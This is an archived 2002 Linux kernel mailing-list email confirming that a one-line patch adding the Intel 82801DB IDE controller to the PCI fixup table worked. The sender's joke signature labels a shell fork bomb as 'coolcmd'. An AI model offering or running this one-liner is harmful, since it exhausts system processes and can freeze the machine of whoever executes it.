Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S317887AbSIJSPY>; Tue, 10 Sep 2002 14:15:24 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S317862AbSIJSPA>; Tue, 10 Sep 2002 14:15:00 -0400
Received: from darkface.pp.se ([212.105.77.200]:32902 "EHLO
	akilles.darkface.pp.se") by vger.kernel.org with ESMTP
	id <S317887AbSIJSNt>; Tue, 10 Sep 2002 14:13:49 -0400
Message-Id: <200209101818.g8AIIBme012996@akilles.darkface.pp.se>
Content-Type: text/plain; charset=US-ASCII
From: Thomas Habets <thomas@habets.pp.se>
To: Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
Subject: 82801DB ide patch worked
Date: Tue, 10 Sep 2002 18:59:15 +0200
X-Mailer: KMail [version 1.3.2]
Cc: Marcelo Tosatti <marcelo@conectiva.com.br>
MIME-Version: 1.0
Content-Transfer-Encoding: 7BIT
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


I didn't see this patch in 2.4.20-pre5. It did the job for my box, so I guess
that's a confirm.

http://lists.insecure.org/linux-kernel/2002/Jul/0401.html

The patch (prolly garbled by mailer, see link above for ungarbled):
- --- linux/arch/i386/kernel/pci-pc.c.orig 2002-07-03 15:48:46.000000000 -0400
+++ linux/arch/i386/kernel/pci-pc.c 2002-07-03 15:50:19.000000000 -0400
@@ -1250,6 +1250,7 @@
         { PCI_FIXUP_HEADER, PCI_VENDOR_ID_INTEL,
PCI_DEVICE_ID_INTEL_82454GX, pci_fixup_i450gx },
         { PCI_FIXUP_HEADER, PCI_VENDOR_ID_UMC, PCI_DEVICE_ID_UMC_UM8886BF,
pci_fixup_umc_ide },
         { PCI_FIXUP_HEADER, PCI_VENDOR_ID_SI, PCI_DEVICE_ID_SI_5513,
pci_fixup_ide_trash },
+ { PCI_FIXUP_HEADER, PCI_VENDOR_ID_INTEL, PCI_DEVICE_ID_INTEL_82801DB_11,
pci_fixup_ide_trash },
         { PCI_FIXUP_HEADER, PCI_ANY_ID, PCI_ANY_ID, pci_fixup_ide_bases },
         { PCI_FIXUP_HEADER, PCI_VENDOR_ID_SI, PCI_DEVICE_ID_SI_5597,
pci_fixup_latency },
         { PCI_FIXUP_HEADER, PCI_VENDOR_ID_SI, PCI_DEVICE_ID_SI_5598,
pci_fixup_latency },

- ---------
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.pp.se" };
  char kernel[]    = { "Linux 2.4" };
  char *pgpKey[]   = { "http://darkface.pp.se/~thompa/pubkey.txt" };
  char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.0.6 (GNU/Linux)
Comment: For info see http://www.gnupg.org

iD8DBQE9fiTqKGrpCq1I6FQRAgCUAKCXO1x+bDpOWRrS7Q9yAnUZYRkL1gCgshrq
IBQOCGvCcOc3B8CALKwtrR8=
=S/Hl
-----END PGP SIGNATURE-----
